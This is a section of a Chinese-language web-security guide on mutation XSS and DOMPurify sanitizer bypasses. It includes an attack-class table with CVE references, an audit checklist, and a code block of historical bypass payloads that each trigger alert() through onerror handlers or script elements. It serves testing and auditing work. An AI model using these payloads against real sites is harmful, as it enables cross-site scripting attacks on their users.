## 七、mXSS深度：DOMPurify历史绕过全谱系

### 7.1 mXSS原理
mXSS（突变XSS）发生在**序列化→再解析**环节：消毒器检查的是第一次解析的DOM树，而浏览器对消毒后字符串再次解析时产生不同的树（突变），复活被"清除"的危险节点。DOMPurify官方总结的核心规则：
- **消毒输出是上下文绑定的**：`sanitize()`的输出只在"innerHTML插入"这一约定上下文安全；用于`script.text`/`setAttribute('title')`/`svgElement.innerHTML`/模板引擎二次渲染都会打破安全契约
- **字符串比对是弱测试**：`clean.includes('onerror')`检测不到解析器突变
- **正确测试**：消毒→序列化→再解析→检查活动节点（`container.querySelector('[onerror]')`）

### 7.2 mXSS攻击类总览（DOMPurify Attack Classes）
| 攻击类 | 原理 | 代表CVE |
|--------|------|---------|
| 命名空间混淆 | HTML/SVG/MathML解析规则不同，跨命名空间边界复活 | 2.0.17 MathML bypass |
| Rawtext Breakout | style/script/textarea等rawtext元素内闭合逃逸 | 2.0.7-2.0.17系列 |
| 深度限制平坦化 | 深层嵌套触发解析器repair机制压平DOM | CVE-2024-47875 |
| 嵌套mXSS+原型污染 | 特殊嵌套绕过深度检查+PP削弱消毒器 | CVE-2024-45801 |
| 模板表达式重组 | 消毒后字符串再拼接进模板时重组 | 通用类 |
| 引擎延迟DOM突变 | 消毒引擎与最终浏览器引擎解析差异 | 跨引擎类 |
| Re-contextualization | 消毒输出被拼入特殊包装器再解析（二次解析上下文切换） | **CVE-2026-0540** |
| SVG shadow-tree | `<use>`元素引用foreignObject内script，消毒器未跨边界检查 | **CVE-2026-2449** |
| DOM clobbering | form等元素name属性覆盖消毒器内部检查属性 | **CVE-2026-49459** |
| Custom element hook绕过 | 自定义元素允许列表下afterSanitizeElements钩子不执行 | **CVE-2026-66010** |

### 7.3 DOMPurify历史绕过Payload谱系（含2026最新）
```html
<!-- 经典命名空间混淆（2.0.17） -->
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>"></style><img src=1 onerror=alert(1)>">

<!-- 注释突变（Gareth Heyes, PortSwigger） -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

<!-- 深度限制平坦化类（CVE-2024-47875形态） -->
<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>

<!-- Re-contextualization（CVE-2026-0540，3.1.3-3.3.1）
     应用把sanitize输出拼进 <xmp>/<script>/<iframe>/<noembed>/<noframes>/<noscript> 包装器再innerHTML -->
<img src=x alt="</xmp><img src=x onerror=alert('xss')>">

<!-- SVG use shadow-tree（CVE-2026-2449，3.2.5）
     消毒器信任foreignObject内已检查子树，use引用阴影实例复活script -->
<svg>
 <use href="#x"/>
 <foreignObject>
  <svg id="x">
   <script>alert(document.domain)</script>
  </svg>
 </foreignObject>
</svg>

<!-- DOM clobbering + IN_PLACE（CVE-2026-49459，<3.4.6）
     form内子元素name覆盖_isClobbered检查属性，事件属性被保留 -->
<form onfocus=alert(1)><input name=attributes><input name=nodeName></form>
```
**注意**：以上均为历史绕过，当前最新DOMPurify版本已修复。实战价值在于：
1. 测试应用是否固定了旧版本DOMPurify（检查lockfile版本号）
2. 理解攻击类以构建新绕过
3. 审计应用的"二次解析"模式（sanitize输出被拼接/再解析的位置）

### 7.4 消毒器绕过审计要点（防御者视角测试）
- 检查`DOMPurify.sanitize()`调用点：返回值是否被拼接到字符串/模板/URL/srcdoc中二次解析
- 检查`ALLOWED_TAGS`/`ALLOWED_ATTR`自定义配置是否放宽（`FORBID_TAGS`配置遗漏）
- 检查`IN_PLACE: true`模式调用（CVE-2026-49459攻击面）
- 检查`CUSTOM_ELEMENT_HANDLING`自定义元素配置（CVE-2026-66010攻击面）
- 检查服务端消毒（jsdom）与客户端渲染引擎差异（引擎延迟突变）

